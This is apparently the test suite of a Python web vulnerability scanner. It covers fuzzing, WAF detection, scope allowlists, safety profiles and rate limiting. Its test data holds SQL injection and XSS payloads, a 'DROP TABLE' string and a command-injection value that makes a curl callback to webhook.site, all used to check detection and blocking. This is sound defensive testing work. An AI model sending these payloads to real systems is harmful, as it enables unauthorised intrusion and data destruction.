import asyncio
import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SMART = ROOT / 'smart_scanner'
sys.path.insert(0, str(SMART))

from crawler_core import AsyncCrawlerEngine
from utils.request_handler import RequestHandler
from fingerprint.attack_surface.exploit_manager import ExploitManager


def test_export_results_supports_html_and_json(tmp_path):
    manager = ExploitManager(RequestHandler(timeout=1, max_retries=1))
    manager.current_scan = {
        'start_time': '2026-01-01T00:00:00',
        'end_time': '2026-01-01T00:00:10',
        'urls_count': 2,
        'parameters_count': 3,
        'total_vulnerabilities': 1,
        'results': [{
            'url': 'https://example.com/test?x=1',
            'parameter': 'x',
            'payload': "' OR 1=1 --",
            'confidence': 'High',
            'status_code': 200,
        }],
    }

    json_path = tmp_path / 'scan_report.json'
    html_path = tmp_path / 'scan_report.html'

    assert manager.export_results(str(json_path)) == str(json_path)
    assert json_path.exists()
    data = json.loads(json_path.read_text(encoding='utf-8'))
    assert data['scan_summary']['total_vulnerabilities'] == 1

    assert manager.export_results(str(html_path)) == str(html_path)
    assert html_path.exists()
    html = html_path.read_text(encoding='utf-8')
    assert '<html' in html.lower()
    assert 'SQL Injection' in html or 'Vulnerability Report' in html


def test_crawler_tracks_depth_and_history():
    crawler = AsyncCrawlerEngine({'max_pages': 10, 'concurrency': 1, 'headless': True, 'max_depth': 2})
    assert crawler.config['max_depth'] == 2

    manager = ExploitManager(RequestHandler(timeout=1, max_retries=1))
    manager.current_scan = {
        'start_time': '2026-01-01T00:00:00',
        'end_time': '2026-01-01T00:00:10',
        'urls_count': 1,
        'parameters_count': 1,
        'total_vulnerabilities': 0,
        'results': [],
    }
    manager.scan_history.append(manager.current_scan)

    history = manager.get_scan_history()
    assert len(history) == 1
    assert history[0]['urls_count'] == 1


def test_crawler_extracts_csrf_and_auth_headers():
    crawler = AsyncCrawlerEngine({
        'max_pages': 5,
        'concurrency': 1,
        'headless': True,
        'auth_enabled': True,
        'login_url': 'https://example.com/login',
        'user_field': 'username',
        'pass_field': 'password',
        'csrf_field': 'csrf_token',
        'extra_headers': {'X-Requested-With': 'XMLHttpRequest'},
    })

    html = '''
    <html>
      <head>
        <meta name="csrf-token" content="abc123" />
      </head>
      <body>
        <input type="hidden" name="csrf_token" value="abc123" />
      </body>
    </html>
    '''

    token = crawler.extract_csrf_token(html)
    assert token == 'abc123'

    headers = crawler.build_request_headers()
    assert headers['X-Requested-With'] == 'XMLHttpRequest'
    assert 'User-Agent' in headers


def test_response_analyzer_uses_waf_and_false_positive_rules():
    from utils.response_analyzer import ResponseAnalyzer

    blocked = ResponseAnalyzer.analyze_response(
        403,
        "Access denied by WAF. Verify you are not a bot. Please complete the CAPTCHA.",
        "' OR 1=1 --"
    )
    assert blocked['is_blocked'] is True
    assert blocked['confidence'] == 'Low'
    assert blocked['blocked_reason'] == 'WAF/anti-bot'

    high_conf = ResponseAnalyzer.analyze_response(
        200,
        "ERROR: You have an error in your SQL syntax near ' OR 1=1 --'",
        "' OR 1=1 --"
    )
    assert high_conf['confidence'] in {'High', 'Medium'}
    assert high_conf['is_blocked'] is False


def test_request_handler_tracks_session_state():
    handler = RequestHandler(timeout=1, max_retries=1)
    handler.set_session_cookie('sessionid', 'abc123')
    handler.set_session_header('X-CSRF-Token', 'csrf-xyz')

    assert handler.session_cookies['sessionid'] == 'abc123'
    assert handler.session_headers['X-CSRF-Token'] == 'csrf-xyz'
    assert 'sessionid=abc123' in handler.cookie_header()


def test_fuzzer_engine_injects_payload_into_post_form():
    from utils.fuzzer_engine import FuzzerEngine

    class FakeResponse:
        status_code = 200
        text = "Normal response"

    class FakeRequestHandler:
        def __init__(self):
            self.sent_data = []

        async def send_request(self, method, url, data=None, params=None, headers=None):
            self.sent_data.append({'method': method, 'url': url, 'data': data})
            return FakeResponse()

    form = {
        'source_page': 'https://example.com/page',
        'action': 'https://example.com/login',
        'method': 'POST',
        'inputs': [
            {'name': 'username', 'type': 'text', 'value': ''},
            {'name': 'password', 'type': 'password', 'value': ''}
        ]
    }

    handler = FakeRequestHandler()
    engine = FuzzerEngine(handler, max_concurrent=2, timeout=1)

    asyncio.run(engine.fuzz_form(form, ["' OR 1=1--", "<script>alert(1)</script>"]))

    # Mỗi payload được gửi qua POST với dữ liệu form
    sent_methods = [s['method'] for s in handler.sent_data]
    assert all(m == 'POST' for m in sent_methods)
    assert len(handler.sent_data) == 4  # 2 payloads x 2 inputs

    # Kiểm tra dữ liệu gửi đi: mỗi request có payload vào param đang test
    payloads_sent = set()
    for s in handler.sent_data:
        data = s['data'] or {}
        for k, v in data.items():
            if v in ("' OR 1=1--", "<script>alert(1)</script>"):
                payloads_sent.add(v)
    assert "' OR 1=1--" in payloads_sent
    assert "<script>alert(1)</script>" in payloads_sent


def test_fuzzer_engine_get_form_injects_query_parameter():
    from utils.fuzzer_engine import FuzzerEngine

    class FakeResponse:
        status_code = 200
        text = "Normal response"

    class FakeRequestHandler:
        def __init__(self):
            self.sent_urls = []

        async def send_request(self, method, url, data=None, params=None, headers=None):
            self.sent_urls.append(url)
            return FakeResponse()

    form = {
        'source_page': 'https://example.com/search',
        'action': 'https://example.com/search',
        'method': 'GET',
        'inputs': [
            {'name': 'q', 'type': 'text', 'value': ''}
        ]
    }

    handler = FakeRequestHandler()
    engine = FuzzerEngine(handler, max_concurrent=2, timeout=1)

    asyncio.run(engine.fuzz_form(form, ["' OR 1=1--"]))

    assert len(handler.sent_urls) == 1
    assert 'q=' in handler.sent_urls[0]
    assert "%27+OR+1%3D1--" in handler.sent_urls[0]


def test_exploit_manager_accepts_forms_in_scan():
    manager = ExploitManager(RequestHandler(timeout=1, max_retries=1))

    forms = [
        {
            'source_page': 'https://example.com/page',
            'action': 'https://example.com/login',
            'method': 'POST',
            'inputs': [
                {'name': 'username', 'type': 'text', 'value': ''},
                {'name': 'password', 'type': 'password', 'value': ''}
            ]
        }
    ]

    # Không chạy scan thực tế, chỉ kiểm tra run_scan nhận tham số forms
    async def fake_scan(*args, **kwargs):
        return []

    manager.scanner.scan_sqli = fake_scan
    manager.scanner.scan_xss = fake_scan
    manager.scanner.scan_rce = fake_scan

    asyncio.run(manager.run_scan(['https://example.com'], ['param'], ['sqli'], forms=forms))

    assert manager.current_scan['forms_count'] == 1

    report = manager.get_scan_report()
    assert report['scan_summary']['forms_scanned'] == 1


# ══════════════════════════════════════════════════════════════
# Bước 7: Scope Guard + Safety Profile + Rate Limiting
# ══════════════════════════════════════════════════════════════

def test_scope_guard_blocks_out_of_scope_target():
    from utils.scope_guard import ScopeGuard

    guard = ScopeGuard({
        'allowlist': ['example.com'],
        'local_lab_mode': False,
    })

    # Target trong allowlist
    result = guard.authorize_target('https://example.com/page', confirm=True)
    assert result['allowed'] is True

    # Target ngoài allowlist bị chặn
    result = guard.authorize_target('https://evil.com')
    assert result['allowed'] is False
    assert 'allowlist' in result['reason']

    # is_allowed cũng chặn
    assert guard.is_allowed('https://evil.com') is False
    assert guard.is_allowed('https://example.com/page') is True


def test_scope_guard_blocks_localhost_without_local_lab_mode():
    from utils.scope_guard import ScopeGuard

    # Khi TẮT Local Lab Mode → chặn localhost
    guard = ScopeGuard({'local_lab_mode': False})
    result = guard.authorize_target('http://localhost:8000')
    assert result['allowed'] is False


def test_scope_guard_allows_localhost_with_local_lab_mode():
    from utils.scope_guard import ScopeGuard

    # Bật Local Lab Mode → cho phép localhost
    guard = ScopeGuard({'local_lab_mode': True})
    result = guard.authorize_target('http://localhost:8000', confirm=True)
    assert result['allowed'] is True

    # allowlist wildcard domain
    guard = ScopeGuard({
        'allowlist': ['*.staging.com'],
        'local_lab_mode': False,
    })
    assert guard.is_allowed('https://app.staging.com') is True
    assert guard.is_allowed('https://evil.com') is False


def test_scope_guard_allows_everything_by_default():
    from utils.scope_guard import ScopeGuard

    # Mặc định (không truyền config) → cho phép quét MỌI trang, kể cả localhost
    guard = ScopeGuard()
    assert guard.local_lab_mode is True
    assert guard.is_allowed('http://localhost:8000') is True
    assert guard.is_allowed('http://192.168.1.10') is True
    assert guard.is_allowed('https://example.com') is True

    result = guard.authorize_target('http://localhost:8000', confirm=True)
    assert result['allowed'] is True

    # Denylist vẫn luôn chặn dù ở mặc định
    guard = ScopeGuard({'denylist': ['evil.com']})
    assert guard.is_allowed('https://evil.com') is False


def test_scope_guard_audit_trail():
    from utils.scope_guard import ScopeGuard

    guard = ScopeGuard({'allowlist': ['example.com']})
    result = guard.authorize_target('https://example.com', confirm=True)
    guard.audit_log('authorize', 'https://example.com', result)

    audit = guard.get_audit_trail()
    assert len(audit) == 1
    assert audit[0]['action'] == 'authorize'
    assert audit[0]['url'] == 'https://example.com'
    assert audit[0]['allowed'] is True


def test_safety_profile_defines_expected_config():
    from utils.safety_profiles import SafetyProfile

    profile = SafetyProfile('safe-active')
    assert profile.inject_payloads is True
    assert profile.destructive_payloads is False
    assert profile.require_confirmation is True

    passive = SafetyProfile('passive')
    assert passive.inject_payloads is False


def test_safety_manager_blocks_destructive_payloads():
    from utils.safety_profiles import SafetyManager
    from utils.scope_guard import ScopeGuard

    guard = ScopeGuard({'allowlist': ['example.com'], 'local_lab_mode': True})
    manager = SafetyManager('safe-active', guard)

    # Destructive payload bị chặn
    result = manager.check_payload("'; DROP TABLE users;--")
    assert result['allowed'] is False
    assert 'Destructive' in result['reason']

    # External callback bị chặn
    result = manager.check_payload("'; curl http://webhook.site/test;--")
    assert result['allowed'] is False
    assert 'External callback' in result['reason']

    # Payload an toàn được phép
    result = manager.check_payload("' OR 1=1--")
    assert result['allowed'] is True


def test_safety_manager_blocks_out_of_scope_and_methods():
    from utils.safety_profiles import SafetyManager
    from utils.scope_guard import ScopeGuard

    guard = ScopeGuard({'allowlist': ['example.com'], 'local_lab_mode': True})
    manager = SafetyManager('safe-active', guard)

    # URL ngoài scope bị chặn
    check = manager.check_request('GET', 'https://evil.com/page')
    assert check['allowed'] is False

    # URL trong scope được phép
    check = manager.check_request('GET', 'https://example.com/page')
    assert check['allowed'] is True

    # DELETE không nằm trong safe-active profile
    check = manager.check_request('DELETE', 'https://example.com/page')
    assert check['allowed'] is False
    assert 'DELETE' in check['reason']


def test_rate_limiter_controls_rps():
    from utils.safety_profiles import RateLimiter

    async def test_rate_limiting():
        limiter = RateLimiter(rps=3)
        start = time.monotonic()
        for _ in range(6):
            await limiter.acquire()
        elapsed = time.monotonic() - start
        # 6 requests với RPS=3 mất ít nhất ~1 giây
        assert elapsed >= 0.9

    asyncio.run(test_rate_limiting())


def test_circuit_breaker_opens_after_consecutive_failures():
    from utils.safety_profiles import CircuitBreaker

    breaker = CircuitBreaker(max_consecutive_failures=3, reset_timeout=30)

    # Ban đầu cho phép
    assert breaker.can_proceed() is True

    # 3 lần thất bại liên tiếp → mở circuit breaker
    breaker.record_failure()
    breaker.record_failure()
    breaker.record_failure()

    assert breaker.can_proceed() is False
    assert breaker.get_state()['state'] == 'OPEN'

    # Sau timeout, cho phép lại
    breaker.last_failure_time = time.monotonic() - 31
    assert breaker.can_proceed() is True
    assert breaker.get_state()['state'] == 'CLOSED'


def test_exploit_manager_blocks_injection_with_passive_profile():
    from utils.safety_profiles import SafetyManager
    from utils.scope_guard import ScopeGuard
    from utils.request_handler import RequestHandler

    guard = ScopeGuard({'allowlist': ['example.com'], 'local_lab_mode': True})
    safety_manager = SafetyManager('passive', guard)

    handler = RequestHandler(timeout=1, max_retries=1, safety_manager=safety_manager)
    manager = ExploitManager(handler)

    async def fake_scan(*args, **kwargs):
        return [{'vuln': 'test'}]

    manager.scanner.scan_sqli = fake_scan
    manager.scanner.scan_xss = fake_scan
    manager.scanner.scan_rce = fake_scan

    # passive profile không cho inject payload → không chạy scan
    asyncio.run(manager.run_scan(['https://example.com'], ['param'], ['sqli']))

    assert manager.current_scan['total_vulnerabilities'] == 0
    assert 'note' in manager.current_scan
    assert 'không cho phép inject' in manager.current_scan['note']